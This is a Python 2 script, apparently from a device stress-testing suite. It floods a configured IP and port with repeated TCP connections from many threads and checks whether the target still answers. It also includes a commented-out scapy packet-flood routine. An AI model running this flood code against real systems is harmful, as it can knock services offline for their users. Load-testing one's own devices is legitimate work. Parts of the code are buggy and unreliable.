# This is the main DOS group code
# First it will generate DDOS (Denial of service) attack on the device while checking if
# the device responds correctly
import socket
import sys
import pickle
from time import sleep
from threading import Thread
# from time import sleep
# from scapy.all import *


class Communicator(object):
    def __init__(self, _ip, _port):
        self.partner_ip = _ip
        self.port = int(_port)
        self.data = """GET http://192.168.1.30:8080/weather/\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
X-DevTools-Emulate-Network-Conditions-Client-Id: 168D3B43-9079-4DE6-B719-02D5E0CE4114\r\n
Upgrade-Insecure-Requests: 1\r\n
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\r\n
Accept-Encoding: gzip, deflate, sdch\r\n
Accept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4\r\n"""

    def communicate(self):
        try:
            count = 0
            for index in range(10):
                communicator_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                communicator_socket.connect((self.partner_ip, self.port ))
                communicator_socket.send(self.data)
                receive_data = communicator_socket.recv(512)
                print receive_data
                count += 1
                communicator_socket.shutdown
                communicator_socket.close()
                sleep(1)
            if count == i:
                print "Succesfull - The device can respond while being flooded"
                # raw_input("Press any key to end test")    //helped debug at first
                return True
            else:
                print "FAIL!!! - The device cannot respond while being flooded"
                # raw_input("Press any key to end test")
                return False
        except socket.error, e:
            print e
            print "Connumication Failed, Device is not resistance to"


class SimpleDOSCannon(object):
    def __init__(self, _ip, _port):
        self.target_ip = _ip
        self.port = int(_port)
        self.data = """GET http://192.168.1.30:8080/weather/\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
X-DevTools-Emulate-Network-Conditions-Client-Id: 168D3B43-9079-4DE6-B719-02D5E0CE4114\r\n
Upgrade-Insecure-Requests: 1\r\n
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36\r\n
Accept-Encoding: gzip, deflate, sdch\r\n
Accept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4\r\n"""

    def attack(self):
        msg = str.encode(self.data)
        index = 0
        while True:
            try:
                #  sleep(1)
                index += 1
                # if index % 100 == 0:
                #     print index
                cannon_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                cannon_socket.connect((self.target_ip, self.port))
                cannon_socket.send(msg)
                # receive_data = cannon_socket.recv(512)
                # print receive_data
                cannon_socket.shutdown
                cannon_socket.close()
                del cannon_socket
            except socket.error, e:
                print e
                cannon_socket.shutdown(socket.SHUT_RDWR)
                cannon_socket.close
                del cannon_socket
                print "Thread has failed!!!"

    def set_target(self, _target):
        self.target_ip = _target

    def aim_at_target(self):
        cannon_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            cannon_socket.connect((self.target_ip, self.port))
            cannon_socket.send("Hello")
            print (" Found Target!!!")
        except (IOError, socket.error, socket.herror) as e:
            print e


def collect_param():
    # param_file = open('../parameters', 'rb')   # for debug purposes
    param_file = open('Groups//parameters', 'rb')
    param_list = pickle.load(param_file)
    param_file.close()
    return param_list


def parse_param(param_list):
    parsed_param = {}
    for item in param_list:
        parsed_param[item[0]] = item[1]
    return parsed_param


def thread_routine(_parsed_parameters_main):
    cannon = SimpleDOSCannon(_ip=_parsed_parameters_main['_IP'], _port=_parsed_parameters_main['_Port'])
    cannon.aim_at_target()
    print "Preparing to attack"
    cannon.attack()

"""
def scapy_attack(src_ip, dest_ip, src_port, dest_port ):
    i=1
    while True:
        IP1 = scapy.IP(src=src_ip, dst=dest_ip)
        TCP1 = scapy.TCP(sport=src_port, dport=dest_port)
        pkt = IP1 / TCP1
        scapy.send(pkt, inter= .001)
        print "packet sent" , i
        i = i+1
"""


if __name__ == "__main__":
    for NUM_CANNON in range (20):
        print 'GET / HTTP /1.1\r\nHost: google.com\r\n\r\n'
        print "DDOS Group - check the device resistance to tcp flood of %s Cannons" % NUM_CANNON
        parameters = collect_param()
        parsed_parameters_main = parse_param(parameters)
        print "Parsed Successfully"
        # if parsed_parameters_main["_Scapy"]:
        # scapy_attack(dest_port=["_Port"],dest_ip=parsed_parameters_main["_IP"],src_ip='192.168.1.1', src_port=8080)
        th = ['']*NUM_CANNON
        for i in range(NUM_CANNON):
            th[i] = Thread(target=thread_routine, args=(parsed_parameters_main, ))
            th[i].setDaemon(True)
            sleep(0.1)
            th[i].start()
        com = Communicator(_ip=parsed_parameters_main["_IP"], _port=parsed_parameters_main["_Port"])
        sleep(5)
        if com.communicate() is False:
            print "Could resist up to %s Cannons" % (NUM_CANNON - 1)
            break

